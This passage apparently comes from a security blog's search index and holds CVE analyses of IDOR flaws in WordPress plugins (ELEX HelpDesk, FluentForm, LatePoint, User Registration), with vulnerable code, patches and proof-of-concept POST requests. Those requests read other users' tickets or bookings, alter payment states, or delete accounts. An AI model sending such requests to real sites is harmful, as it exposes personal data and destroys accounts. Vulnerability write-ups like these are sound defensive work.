D[\"Get ticket_id from request\"] D --\u003e E[\"Load ticket by ticket_id\"] E --\u003e F[\"No ownership check\"] F --\u003e G[\"No role validation\"] G --\u003e H[\"Return full ticket data\"] H --\u003e I[\"User can view other users' tickets (IDOR)\"] flowchart TD A[\"Authenticated User (Subscriber+)\"] --\u003e B[\"Request admin-ajax.php?action=eh_crm_ticket_single_view_client\"] B --\u003e C[\"Verify nonce\"] C --\u003e D[\"Get ticket_id from request\"] D --\u003e E[\"Load ticket by ticket_id\"] E --\u003e F[\"No ownership check\"] F --\u003e G[\"No role validation\"] G --\u003e H[\"Return full ticket data\"] H --\u003e I[\"User can view other users' tickets (IDOR)\"] ","date":"2025-12-28","objectID":"/posts/2025-12-28-cve-2025-10039/:4:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-10039 Analysis \u0026 POC","uri":"/posts/2025-12-28-cve-2025-10039/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Log in as a Subscriber+ user: Submit any ticket In the Your Tickets table, obtain the nonce by viewing the page source: Nonce Send the following request using the obtained nonce: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: Subscriber+ cookie action=eh_crm_ticket_single_view_client\u0026nonce=4de88a7186\u0026ticket_id=any_ticket_id Result: Result The response contains the ticket content and the ticket author’s information. ","date":"2025-12-28","objectID":"/posts/2025-12-28-cve-2025-10039/:5:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-10039 Analysis \u0026 POC","uri":"/posts/2025-12-28-cve-2025-10039/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability exists because the eh_crm_ticket_single_view_client endpoint does not verify ticket ownership, relying solely on the user-supplied ticket_id. This allows any authenticated user to access other users’ tickets → IDOR. The patch mitigates the issue by: Comparing ticket_author with current_user_id Allowing access only for authorized roles Rejecting unauthorized requests before returning data ","date":"2025-12-28","objectID":"/posts/2025-12-28-cve-2025-10039/:6:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-10039 Analysis \u0026 POC","uri":"/posts/2025-12-28-cve-2025-10039/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways nonce does not replace authorization checks Never trust client-supplied identifiers Always validate ownership before accessing resources Authorization must be enforced server-side before returning responses ","date":"2025-12-28","objectID":"/posts/2025-12-28-cve-2025-10039/:7:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-10039 Analysis \u0026 POC","uri":"/posts/2025-12-28-cve-2025-10039/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References IDOR WordPress ELEX WordPress HelpDesk \u0026 Customer Ticketing System Plugin \u003c= 3.2.9 is vulnerable to Insecure Direct Object References (IDOR) ","date":"2025-12-28","objectID":"/posts/2025-12-28-cve-2025-10039/:8:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-10039 Analysis \u0026 POC","uri":"/posts/2025-12-28-cve-2025-10039/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress FluentForm Plugin.","date":"2025-12-27","objectID":"/posts/2025-12-27-cve-2025-13748/","tags":["analyst","plugin","idor"],"title":"CVE-2025-13748 Analysis \u0026 POC","uri":"/posts/2025-12-27-cve-2025-13748/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The plugin Fluent Forms – Customizable Contact Forms, Survey, Quiz, \u0026 Conversational Form Builder contains an Insecure Direct Object Reference (IDOR) vulnerability in all versions ≤ 6.1.7 via the submission_id parameter in the SCA payment confirmation endpoint. The vulnerability allows unauthenticated users to mark other users’ submissions as failed, disrupting the payment process. CVE ID: CVE-2025-13748 Vulnerability Type: Insecure Direct Object References (IDOR) Affected Versions: \u003c= 6.1.7 Patched Versions: 6.1.8 CVSS severity: Low (6.5) Required Privilege: Unauthenticated Product: WordPress FluentForm Plugin ","date":"2025-12-27","objectID":"/posts/2025-12-27-cve-2025-13748/:1:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-13748 Analysis \u0026 POC","uri":"/posts/2025-12-27-cve-2025-13748/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - FluentForm: 6.1.7 – vulnerable 6.1.8 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-27","objectID":"/posts/2025-12-27-cve-2025-13748/:2:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-13748 Analysis \u0026 POC","uri":"/posts/2025-12-27-cve-2025-13748/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers an AJAX handler for unauthenticated users: StripeInlineProcessor.php v6.1.7 add_action('wp_ajax_nopriv_fluentform_sca_inline_confirm_payment', [$this, 'confirmScaPayment']); wp_ajax_nopriv_ is a hook for unauthenticated users. When a request is sent to the endpoint /wp-admin/admin-ajax.php with the parameter action=fluentform_sca_inline_confirm_payment, the callback confirmScaPayment is executed: StripeInlineProcessor.php v6.1.7 public function confirmScaPayment() { // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature $formId = isset($_REQUEST['form_id']) ? intval($_REQUEST['form_id']) : 0; // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature $submissionId = isset($_REQUEST['submission_id']) ? intval($_REQUEST['submission_id']) : 0; // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature $paymentMethod = isset($_REQUEST['payment_method']) ? sanitize_text_field(wp_unslash($_REQUEST['payment_method'])) : ''; // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature $paymentIntentId = isset($_REQUEST['payment_intent_id']) ? sanitize_text_field(wp_unslash($_REQUEST['payment_intent_id'])) : ''; $this-\u003esetSubmissionId($submissionId); $submission = $this-\u003egetSubmission(); $this-\u003eform = $this-\u003egetForm(); $transaction = $this-\u003egetLastTransaction($submissionId); $confirmation = SCA::confirmPayment($paymentIntentId, [ 'payment_method' =\u003e $paymentMethod ], $formId); if (is_wp_error($confirmation)) { $message = 'Payment has been failed. ' . $confirmation-\u003eget_error_message(); $this-\u003ehandlePaymentChargeError($message, $submission, $transaction, $confirmation, 'payment_error'); } if ($confirmation-\u003estatus == 'succeeded') { $charge = $confirmation-\u003echarges-\u003edata[0];; $this-\u003ehandlePaymentSuccess($charge, $transaction, $submission); } else { $this-\u003ehandlePaymentChargeError('We could not verify your payment. Please try again', $submission, $transaction, $confirmation, 'payment_error'); } } Inside confirmScaPayment(), the plugin retrieves submission_id directly from the request: $submissionId = isset($_REQUEST['submission_id']) ? intval($_REQUEST['submission_id']) : 0; This value: Is not bound to the current user Has no ownership validation Is not checked for relationship with form_id Meaning: anyone can send a request and reference any existing submission ID in the database. After retrieving submission_id, the system continues: $this-\u003esetSubmissionId($submissionId); $submission = $this-\u003egetSubmission(); This is where the core IDOR occurs: the object (submission) is accessed directly using a user-controlled ID, without any access control. There is no logic such as: if ($submission-\u003euser_id !== get_current_user_id()) { deny_access(); } Or: if ($submission-\u003eform_id !== $formId) { deny_access(); } This allows submissions belonging to other users to be manipulated by unauthenticated attackers. In the patched version, the entire request must pass strict validation: Patch protected function validateScaRequest($submissionId, $paymentIntentId, $submission = null, $transaction = null) { $strictMode = apply_filters('fluentform/stripe_sca_strict_security', false); $warnings = []; // Validate nonce (optional in non-strict mode for backward compatibility) $nonce = isset($_REQUEST['_ff_stripe_nonce']) ? sanitize_text_field(wp_unslash($_REQUEST['_ff_stripe_nonce'])) : ''; if ($nonce) { $nonceAction = 'fluentform_sca_confirm_' . $submissionId; if (!wp_verify_nonce($nonce, $nonceAction)) { $error = __('Security verification failed. Invalid nonce.', 'fluentform'); if ($strictMode) { return new \\WP_Error('invalid_nonce', $error); } $warnings[] = 'Invalid nonce provided'; } } else { $warning = 'No nonce provided for SCA payment confirmation'; if ($strictMode) { return new \\WP_Error('missing_nonce', __('Security verif","date":"2025-12-27","objectID":"/posts/2025-12-27-cve-2025-13748/:3:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-13748 Analysis \u0026 POC","uri":"/posts/2025-12-27-cve-2025-13748/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow flowchart TD A[\"Unauthenticated Attacker\"] --\u003e B[\"Send request to admin-ajax.php?action=fluentform_sca_inline_confirm_payment\"] B --\u003e C[\"Extract submission_id \u0026 payment_intent_id from request\"] C --\u003e D[\"No nonce validation\"] D --\u003e E[\"Load submission by submission_id\"] E --\u003e F[\"No ownership or relationship check\"] F --\u003e G[\"Load transaction using submission_id\"] G --\u003e H[\"No validation between payment_intent_id and transaction\"] H --\u003e I[\"Process payment confirmation\"] I --\u003e J[\"Update submission status (success / failed)\"] J --\u003e K[\"Attacker manipulates victim's submission\"] flowchart TD A[\"Unauthenticated Attacker\"] --\u003e B[\"Send request to admin-ajax.php?action=fluentform_sca_inline_confirm_payment\"] B --\u003e C[\"Extract submission_id \u0026 payment_intent_id from request\"] C --\u003e D[\"No nonce validation\"] D --\u003e E[\"Load submission by submission_id\"] E --\u003e F[\"No ownership or relationship check\"] F --\u003e G[\"Load transaction using submission_id\"] G --\u003e H[\"No validation between payment_intent_id and transaction\"] H --\u003e I[\"Process payment confirmation\"] I --\u003e J[\"Update submission status (success / failed)\"] J --\u003e K[\"Attacker manipulates victim's submission\"] flowchart TD A[\"Unauthenticated Attacker\"] --\u003e B[\"Send request to admin-ajax.php?action=fluentform_sca_inline_confirm_payment\"] B --\u003e C[\"Extract submission_id \u0026 payment_intent_id from request\"] C --\u003e D[\"No nonce validation\"] D --\u003e E[\"Load submission by submission_id\"] E --\u003e F[\"No ownership or relationship check\"] F --\u003e G[\"Load transaction using submission_id\"] G --\u003e H[\"No validation between payment_intent_id and transaction\"] H --\u003e I[\"Process payment confirmation\"] I --\u003e J[\"Update submission status (success / failed)\"] J --\u003e K[\"Attacker manipulates victim's submission\"] flowchart TD A[\"Unauthenticated Attacker\"] --\u003e B[\"Send request to admin-ajax.php?action=fluentform_sca_inline_confirm_payment\"] B --\u003e C[\"Extract submission_id \u0026 payment_intent_id from request\"] C --\u003e D[\"No nonce validation\"] D --\u003e E[\"Load submission by submission_id\"] E --\u003e F[\"No ownership or relationship check\"] F --\u003e G[\"Load transaction using submission_id\"] G --\u003e H[\"No validation between payment_intent_id and transaction\"] H --\u003e I[\"Process payment confirmation\"] I --\u003e J[\"Update submission status (success / failed)\"] J --\u003e K[\"Attacker manipulates victim's submission\"] ","date":"2025-12-27","objectID":"/posts/2025-12-27-cve-2025-13748/:4:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-13748 Analysis \u0026 POC","uri":"/posts/2025-12-27-cve-2025-13748/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send request: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: victim.com Content-Type: application/x-www-form-urlencoded action=fluentform_sca_inline_confirm_payment \u0026submission_id=1024 \u0026payment_method=card \u0026payment_intent_id=pi_fake ","date":"2025-12-27","objectID":"/posts/2025-12-27-cve-2025-13748/:5:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-13748 Analysis \u0026 POC","uri":"/posts/2025-12-27-cve-2025-13748/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-13748 vulnerability stems from trusting client-controlled input, specifically submission_id, without any ownership or context validation. The payment confirmation endpoint is exposed to unauthenticated users and allows direct manipulation of submissions without binding them to a legitimate user, form, or transaction. The lack of ownership checks, missing linkage between payment_intent_id and transaction, and absence of request authentication collectively enable attackers to manipulate other users’ payment states. This is a textbook case of Insecure Direct Object Reference (IDOR) caused by flawed business logic rather than a low-level technical bug. The patch fully resolves the issue by introducing layered validation, strict checks, and contextual binding, eliminating the attack surface. ","date":"2025-12-27","objectID":"/posts/2025-12-27-cve-2025-13748/:6:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-13748 Analysis \u0026 POC","uri":"/posts/2025-12-27-cve-2025-13748/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Never trust client-supplied data, even in internal payment flows. IDOR vulnerabilities often stem from missing ownership validation, not missing input sanitization. wp_ajax_nopriv_* endpoints must be strictly protected as they are accessible to everyone. Payment flows must tightly bind submission – transaction – payment intent. Always validate both request origin and business context, not just data format. Defense-in-depth is the only effective way to prevent IDOR. ","date":"2025-12-27","objectID":"/posts/2025-12-27-cve-2025-13748/:7:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-13748 Analysis \u0026 POC","uri":"/posts/2025-12-27-cve-2025-13748/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References IDOR WordPress FluentForm Plugin \u003c= 6.1.7 is vulnerable to Insecure Direct Object References (IDOR) ","date":"2025-12-27","objectID":"/posts/2025-12-27-cve-2025-13748/:8:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-13748 Analysis \u0026 POC","uri":"/posts/2025-12-27-cve-2025-13748/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress LatePoint Plugin.","date":"2025-12-26","objectID":"/posts/2025-12-26-cve-2025-3769/","tags":["analyst","plugin","idor"],"title":"CVE-2025-3769 Analysis \u0026 POC","uri":"/posts/2025-12-26-cve-2025-3769/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The LatePoint – Calendar Booking Plugin for Appointments and Events plugin on WordPress contains an Insecure Direct Object Reference (IDOR) vulnerability in all versions up to and including 5.1.92, via the view_booking_summary_in_lightbox parameter, due to missing validation on user-controlled keys. This vulnerability allows an unauthenticated attacker to access appointment details, including customer names and email addresses. CVE ID: CVE-2025-3769 Vulnerability Type: Insecure Direct Object References (IDOR) Affected Versions: \u003c= 5.1.92 Patched Versions: 5.1.93 CVSS severity: Low (5.3) Required Privilege: Unauthenticated Product: WordPress LatePoint Plugin ","date":"2025-12-26","objectID":"/posts/2025-12-26-cve-2025-3769/:1:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3769 Analysis \u0026 POC","uri":"/posts/2025-12-26-cve-2025-3769/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - LatePoint: 5.1.92 – vulnerable 5.1.93 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-26","objectID":"/posts/2025-12-26-cve-2025-3769/:2:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3769 Analysis \u0026 POC","uri":"/posts/2025-12-26-cve-2025-3769/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers the following action hook: latepoint.php v5.1.92 add_action( 'wp_ajax_nopriv_latepoint_route_call', array( $this, 'route_call' ) ); wp_ajax_nopriv_ is a hook for unauthenticated users. When a request is sent to the endpoint /wp-admin/admin-ajax.php with the parameter action=latepoint_route_call, the callback route_call is executed: latepoint.php v5.1.92 public function route_call() { $route_name = OsRouterHelper::get_request_param( 'route_name', OsRouterHelper::build_route_name( 'dashboard', 'index' ) ); OsRouterHelper::call_by_route_name( $route_name, OsRouterHelper::get_request_param( 'return_format', 'html' ) ); } The route_call() function calls get_request_param() with two parameters: 'route_name' and the default value OsRouterHelper::build_route_name( 'dashboard', 'index' ) if the route_name parameter does not exist in the request. route_helper.php v5.1.92 public static function get_request_param($name, $default = false){ // $name = 'route_name' // $default = OsRouterHelper::build_route_name( 'dashboard', 'index' if(isset($_GET[$name])){ $param = sanitize_text_field(wp_unslash($_GET[$name])); }elseif(isset($_POST[$name])){ $param = sanitize_text_field(wp_unslash($_POST[$name])); }else{ $param = $default; } return $param; } route_helper.php v5.1.92 public static function build_route_name($controller, $action){ return $controller.'__'.$action; } After obtaining the value of $route_name, the function continues by calling call_by_route_name: route_helper.php v5.1.92 public static function call_by_route_name($route_name, $return_format = 'html'){ OsDebugHelper::log_route($route_name, $return_format); $route_data = self::convert_route_name_to_controller_and_action($route_name); if(!empty($route_data)){ $controller_obj = $route_data['controller']; $action = $route_data['action']; if($return_format) $controller_obj-\u003eset_return_format($return_format); // check if user is allowed to access this route if($controller_obj-\u003ecan_current_user_access_action($action)){ $controller_obj-\u003eroute_name = $route_name; $controller_obj-\u003e$action(); }else{ if($controller_obj-\u003eget_return_format() == 'json'){ $controller_obj-\u003esend_json( ['status' =\u003e LATEPOINT_STATUS_ERROR, 'message' =\u003e __('Not Authorized', 'latepoint')] ); }else{ echo '\u003cdiv class=\"latepoint-not-authorized\"\u003e\u003cdiv class=\"not-authorized-message\"\u003e'.esc_html__('Not Authorized', 'latepoint').'\u003c/div\u003e\u003c/div\u003e'; } exit(); } }else{ esc_html_e('Page Not Found', 'latepoint'); } } The function call_by_route_name() logs the route and retrieves the corresponding controller and action for that route. route_helper.php v5.1.92 public static function convert_route_name_to_controller_and_action($route_name): array{ list($controller_name, $action) = explode('__', $route_name); if(empty($controller_name) || empty($action)) return []; $controller_name = str_replace('_', '', ucwords($controller_name, '_')); $controller_class_name = 'Os'.$controller_name.'Controller'; if(class_exists($controller_class_name)) { $controller_obj = new $controller_class_name(); if(method_exists($controller_obj, $action)) { // check if action is valid return ['controller' =\u003e $controller_obj, 'action' =\u003e $action]; }else{ return []; } }else{ return []; } } The function receives $route_name in the format 'controller__action'. Split the string by __ into $controller_name and $action. If empty → return []. Convert $controller_name to PascalCase, remove _, and add prefix Os and suffix Controller → class name. Check if the class exists → create object. Check if the method exists in the object → return array ['controller' =\u003e object, 'action' =\u003e method]. If the class or method does not exist → return empty array []. The function call_by_route_name() then checks $route_data. If not empty, it sets the return format and checks access permission via can_current_user_access_action($action). If the current user is allowed to access this action, it calls the method: $controller_obj-\u003e$action(). By default, when a user has","date":"2025-12-26","objectID":"/posts/2025-12-26-cve-2025-3769/:3:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3769 Analysis \u0026 POC","uri":"/posts/2025-12-26-cve-2025-3769/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow flowchart TD A[\"Unauthenticated Attacker\"] --\u003e B[\"Create Booking (no login required)\"] B --\u003e C[\"Creates Customer account\"] C --\u003e D[\"Customer cookie issued (logged-in as customer)\"] D --\u003e E[\"Attacker sends request to admin-ajax.php?action=latepoint_route_call\"] E --\u003e F[\"route_name=customer_cabinet__view_booking_summary_in_lightbox\"] F --\u003e G[\"Router resolves to OsCustomerCabinetController\"] G --\u003e H[\"can_current_user_access_action() → PASS\"] H --\u003e I[\"view_booking_summary_in_lightbox() called\"] I --\u003e J[\"Booking ID taken from request\"] J --\u003e K[\"No ownership validation (\u003c= 5.1.92)\"] K --\u003e L[\"Sensitive booking data leaked (email, name, etc.)\"] flowchart TD A[\"Unauthenticated Attacker\"] --\u003e B[\"Create Booking (no login required)\"] B --\u003e C[\"Creates Customer account\"] C --\u003e D[\"Customer cookie issued (logged-in as customer)\"] D --\u003e E[\"Attacker sends request to admin-ajax.php?action=latepoint_route_call\"] E --\u003e F[\"route_name=customer_cabinet__view_booking_summary_in_lightbox\"] F --\u003e G[\"Router resolves to OsCustomerCabinetController\"] G --\u003e H[\"can_current_user_access_action() → PASS\"] H --\u003e I[\"view_booking_summary_in_lightbox() called\"] I --\u003e J[\"Booking ID taken from request\"] J --\u003e K[\"No ownership validation (\u003c= 5.1.92)\"] K --\u003e L[\"Sensitive booking data leaked (email, name, etc.)\"] flowchart TD A[\"Unauthenticated Attacker\"] --\u003e B[\"Create Booking (no login required)\"] B --\u003e C[\"Creates Customer account\"] C --\u003e D[\"Customer cookie issued (logged-in as customer)\"] D --\u003e E[\"Attacker sends request to admin-ajax.php?action=latepoint_route_call\"] E --\u003e F[\"route_name=customer_cabinet__view_booking_summary_in_lightbox\"] F --\u003e G[\"Router resolves to OsCustomerCabinetController\"] G --\u003e H[\"can_current_user_access_action() → PASS\"] H --\u003e I[\"view_booking_summary_in_lightbox() called\"] I --\u003e J[\"Booking ID taken from request\"] J --\u003e K[\"No ownership validation (\u003c= 5.1.92)\"] K --\u003e L[\"Sensitive booking data leaked (email, name, etc.)\"] flowchart TD A[\"Unauthenticated Attacker\"] --\u003e B[\"Create Booking (no login required)\"] B --\u003e C[\"Creates Customer account\"] C --\u003e D[\"Customer cookie issued (logged-in as customer)\"] D --\u003e E[\"Attacker sends request to admin-ajax.php?action=latepoint_route_call\"] E --\u003e F[\"route_name=customer_cabinet__view_booking_summary_in_lightbox\"] F --\u003e G[\"Router resolves to OsCustomerCabinetController\"] G --\u003e H[\"can_current_user_access_action() → PASS\"] H --\u003e I[\"view_booking_summary_in_lightbox() called\"] I --\u003e J[\"Booking ID taken from request\"] J --\u003e K[\"No ownership validation (\u003c= 5.1.92)\"] K --\u003e L[\"Sensitive booking data leaked (email, name, etc.)\"] ","date":"2025-12-26","objectID":"/posts/2025-12-26-cve-2025-3769/:4:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3769 Analysis \u0026 POC","uri":"/posts/2025-12-26-cve-2025-3769/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send request: POST /wp-admin/admin-ajax.php?t=1766721895425 HTTP/1.1 Host: localhost Cookie: __stripe_mid=f13365af-449c-4412-b77c-7213da0dbe814d9925; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; latepoint_cart_86a9106ae65537651a8e456835b316ab=8ffe0e2c-9c69-48f8-94d9-18dd24022f90; latepoint_customer_logged_in_cookie action=latepoint_route_call\u0026route_name=customer_cabinet__view_booking_summary_in_lightbox\u0026params=booking_id=other_booking_id\u0026return_format=json Result: Result ","date":"2025-12-26","objectID":"/posts/2025-12-26-cve-2025-3769/:5:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3769 Analysis \u0026 POC","uri":"/posts/2025-12-26-cve-2025-3769/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE‑2025‑3769 vulnerability originates from missing ownership validation in the actions of OsCustomerCabinetController. A user with a valid session can access other users’ bookings. Version 5.1.93 fixes this by validating customer_id before returning data, preventing IDOR. ","date":"2025-12-26","objectID":"/posts/2025-12-26-cve-2025-3769/:6:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3769 Analysis \u0026 POC","uri":"/posts/2025-12-26-cve-2025-3769/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Authentication does not equal authorization. Never trust client-supplied data (IDs, routes, params). Always check ownership at the business logic layer. Dynamic routing requires strict access control. IDOR occurs when user–object relationships are not properly validated. ","date":"2025-12-26","objectID":"/posts/2025-12-26-cve-2025-3769/:7:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3769 Analysis \u0026 POC","uri":"/posts/2025-12-26-cve-2025-3769/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References IDOR WordPress LatePoint Plugin \u003c= 5.1.92 is vulnerable to Insecure Direct Object References (IDOR) ","date":"2025-12-26","objectID":"/posts/2025-12-26-cve-2025-3769/:8:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3769 Analysis \u0026 POC","uri":"/posts/2025-12-26-cve-2025-3769/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress User Registration Plugin.","date":"2025-12-25","objectID":"/posts/2025-12-25-cve-2025-3281/","tags":["analyst","plugin","idor"],"title":"CVE-2025-3281 Analysis \u0026 PoC","uri":"/posts/2025-12-25-cve-2025-3281/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The User Registration \u0026 Membership – Custom Registration Form, Login Form, and User Profile plugin for WordPress contains an Insecure Direct Object Reference (IDOR) vulnerability in all versions up to 4.2.1, within the create_stripe_subscription() function, due to missing validation of the user-controlled member_id parameter. This allows an unauthenticated attacker to delete arbitrary user accounts created via this plugin. CVE ID: CVE-2025-3281 Vulnerability Type: Insecure Direct Object References (IDOR) Affected Versions: \u003c= 4.2.1 Patched Versions: 4.2.2 CVSS severity: Low (5.4) Required Privilege: Unauthenticated Product: WordPress User Registration Plugin ","date":"2025-12-25","objectID":"/posts/2025-12-25-cve-2025-3281/:1:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3281 Analysis \u0026 PoC","uri":"/posts/2025-12-25-cve-2025-3281/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – User Registration: 4.2.1 – vulnerable 4.2.2 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-25","objectID":"/posts/2025-12-25-cve-2025-3281/:2:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3281 Analysis \u0026 PoC","uri":"/posts/2025-12-25-cve-2025-3281/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis According to the CVE description, the vulnerability resides in the create_stripe_subscription() function of the plugin. This function handles the creation of Stripe subscriptions for users after registration. AJAX.php v4.2.1 public static function create_stripe_subscription() { ur_membership_verify_nonce( 'ur_membership_confirm_payment' ); $customer_id = isset( $_POST['customer_id'] ) ? $_POST['customer_id'] : ''; $payment_method_id = isset( $_POST['payment_method_id'] ) ? sanitize_text_field( $_POST['payment_method_id'] ) : ''; $member_id = absint( wp_unslash( $_POST['member_id'] ) ); $is_user_created = get_user_meta( $member_id, 'urm_user_just_created' ); if ( ! $is_user_created ) { wp_send_json_error( array( 'message' =\u003e __( 'Invalid Request.', 'user-registration' ), ) ); } $stripe_service = new StripeService(); $form_response = isset( $_POST['form_response'] ) ? (array) json_decode( wp_unslash( $_POST['form_response'] ), true ) : array(); $stripe_subscription = $stripe_service-\u003ecreate_subscription( $customer_id, $payment_method_id, $member_id ); if ( $stripe_subscription['status'] ) { wp_send_json_success( $stripe_subscription ); } else { wp_delete_user( absint( $member_id ) ); wp_send_json_error( array( 'message' =\u003e __( \"Something went wrong when updating users payment status\" ) ) ); } } The function performs a nonce check using ur_membership_verify_nonce( 'ur_membership_confirm_payment' );. Searching for the keyword ur_membership_confirm_payment: Nonce The nonce is created with the key _confirm_payment_nonce. This key and value are included in the /membership-registration/? endpoint. Nonce in response At the beginning of the function, data is taken directly from $_POST, including customer_id, payment_method_id, and especially member_id, which is taken directly from the request without any ownership or permission validation. $member_id = absint( wp_unslash( $_POST['member_id'] ) ); Next, the function checks whether the user associated with member_id has the urm_user_just_created meta key: $is_user_created = get_user_meta( $member_id, 'urm_user_just_created' ); if ( ! $is_user_created ) { wp_send_json_error( ... ); } This means that as long as the user was created through the plugin’s registration flow, the condition passes — there is no check to ensure that the requester is authorized to act on that user. Info Note: the user must be registered via the Registration form at http://localhost/registration/, not via Membership Registration at http://localhost/membership-registration/, for $is_user_created to be valid. Next, the function calls: $stripe_subscription = $stripe_service-\u003ecreate_subscription( $customer_id, $payment_method_id, $member_id ); The return value determines the next execution path. If $stripe_subscription['status'] is false, the following code deletes the user corresponding to $member_id. if ( $stripe_subscription['status'] ) { wp_send_json_success( $stripe_subscription ); } else { wp_delete_user( absint( $member_id ) ); wp_send_json_error( array( 'message' =\u003e __( \"Something went wrong when updating users payment status\" ) ) ); } Tip To force $stripe_subscription['status'] to be false, an attacker can omit or provide invalid values for $customer_id and $payment_method_id, causing the subscription creation to fail and triggering the error branch. This leads to a severe IDOR (Insecure Direct Object Reference) vulnerability, allowing arbitrary deletion of user accounts. The patch in version 4.2.2 adds permission checks before performing operations on the user, preventing IDOR: if ( ! current_user_can( 'edit_user', $member_id ) ) { wp_send_json_error( array( 'message' =\u003e __( 'You are not allowed to edit this user.', 'user-registration' ), ) ); } Before calling $stripe_service-\u003ecreate_subscription(), the function verifies whether the requester has permission to edit the user with member_id. If not, it returns an error and does not delete the user. Patch changes This ensures that only authorized users c","date":"2025-12-25","objectID":"/posts/2025-12-25-cve-2025-3281/:3:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3281 Analysis \u0026 PoC","uri":"/posts/2025-12-25-cve-2025-3281/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow flowchart TD A[\"Attacker (Unauthenticated)\"] --\u003e B[\"Send POST request to admin-ajax.php?action=user_registration_membership_create_stripe_subscription\"] B --\u003e C[\"WordPress routes request via wp_ajax_nopriv_*\"] C --\u003e D[\"create_stripe_subscription() executed\"] D --\u003e E[\"Read POST parameters (member_id, customer_id, payment_method_id)\"] E --\u003e F[\"Check get_user_meta(member_id, 'urm_user_just_created')\"] F --\u003e|Not exists| G[\"Request rejected\"] F --\u003e|Exists| H[\"Call create_subscription()\"] H --\u003e I{\"Stripe subscription valid?\"} I --\u003e|Yes| J[\"Return success response\"] I --\u003e|No| K[\"wp_delete_user(member_id)\"] K --\u003e L[\"Target user deleted\"] flowchart TD A[\"Attacker (Unauthenticated)\"] --\u003e B[\"Send POST request to admin-ajax.php?action=user_registration_membership_create_stripe_subscription\"] B --\u003e C[\"WordPress routes request via wp_ajax_nopriv_*\"] C --\u003e D[\"create_stripe_subscription() executed\"] D --\u003e E[\"Read POST parameters (member_id, customer_id, payment_method_id)\"] E --\u003e F[\"Check get_user_meta(member_id, 'urm_user_just_created')\"] F --\u003e|Not exists| G[\"Request rejected\"] F --\u003e|Exists| H[\"Call create_subscription()\"] H --\u003e I{\"Stripe subscription valid?\"} I --\u003e|Yes| J[\"Return success response\"] I --\u003e|No| K[\"wp_delete_user(member_id)\"] K --\u003e L[\"Target user deleted\"] flowchart TD A[\"Attacker (Unauthenticated)\"] --\u003e B[\"Send POST request to admin-ajax.php?action=user_registration_membership_create_stripe_subscription\"] B --\u003e C[\"WordPress routes request via wp_ajax_nopriv_*\"] C --\u003e D[\"create_stripe_subscription() executed\"] D --\u003e E[\"Read POST parameters (member_id, customer_id, 